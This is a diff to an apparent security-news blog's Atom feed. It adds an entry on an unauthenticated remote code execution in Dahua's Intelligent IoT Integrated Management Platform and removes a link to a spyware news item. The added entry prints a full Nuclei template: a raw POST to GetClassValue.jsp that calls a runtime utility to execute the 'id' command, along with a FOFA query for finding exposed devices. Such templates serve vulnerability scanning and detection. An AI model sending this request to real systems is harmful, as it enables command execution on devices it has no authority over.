@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-14T10:55:55.750Z</updated>
+  <updated>2025-06-14T11:15:10.568Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Dahua Intelligent IoT Integrated Management Platform GetClassValue - Remote Code Execution</title>
+    <link href="http://example.com/2025/06/14/github_2097362760/"/>
+    <id>http://example.com/2025/06/14/github_2097362760/</id>
+    <published>2025-06-14T11:15:10.573Z</published>
+    <updated>2025-06-14T11:15:10.568Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Dahua Intelligent IoT Integrated Management Platform GetClassValue - Remote Code Execution</p><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Dahua Intelligent IoT Integrated Management Platform 存在远程代码执行漏洞，通过GetClassValue.jsp可执行任意命令。</p><p><strong>产品厂商：</strong> Dahua</p><p><strong>产品名称：</strong> Dahua Intelligent IoT Integrated Management Platform</p><p><strong>搜索语法：</strong> app&#x3D;”dahua-智能物联综合管理平台”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/4624073751babfcb7829064fcbed3b182d238fa2/http%2Fvulnerabilities%2Fdahua%2Fdahua-icc-getclassvalue-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/4624073751babfcb7829064fcbed3b182d238fa2/http%2Fvulnerabilities%2Fdahua%2Fdahua-icc-getclassvalue-rce.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> dahua-icc-getclassvalue-rce<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Dahua Intelligent IoT Integrated Management Platform GetClassValue <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> ProjectDiscoveryAI<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Remote Code Execution Vulnerability <span class="hljs-keyword">in</span> Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">fofa-query:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;dahua-智能物联综合管理平台&quot;</span><br>  <span class="hljs-params">tags:</span> rce,java,dahua,iot,unauth<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/evo-apigw/admin/API/Developer/GetClassValue.jsp</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">165</span><br><br>        &#123;<br>            <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;clazzName&quot;</span>: <span class="hljs-string">&quot;com.dahua.admin.util.RuntimeUtil&quot;</span>,<br>                <span class="hljs-string">&quot;methodName&quot;</span>: <span class="hljs-string">&quot;syncexecReturnInputStream&quot;</span>,<br>                <span class="hljs-string">&quot;fieldName&quot;</span>: [<span class="hljs-string">&quot;id&quot;</span>]<br>            &#125;<br>        &#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Dahua Intelligent IoT Integrated Manage</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>新型SmartAttack攻击通过智能手表窃取敏感数据</title>
@@ -519,33 +545,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Paragon iOS 间谍软件首次被确认为针对记者</title>
-    <link href="http://example.com/2025/06/14/weixin_898999651/"/>
-    <id>http://example.com/2025/06/14/weixin_898999651/</id>
-    <published>2025-06-14T03:10:41.209Z</published>
-    <updated>2025-06-14T03:10:41.205Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/onD0LfmoW4I8kcOxqRzSQQ">https://mp.weixin.qq.com/s/onD0LfmoW4I8kcOxqRzSQQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/onD0LfmoW4I8kcOxqRzSQQ&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
     
   </entry>
   
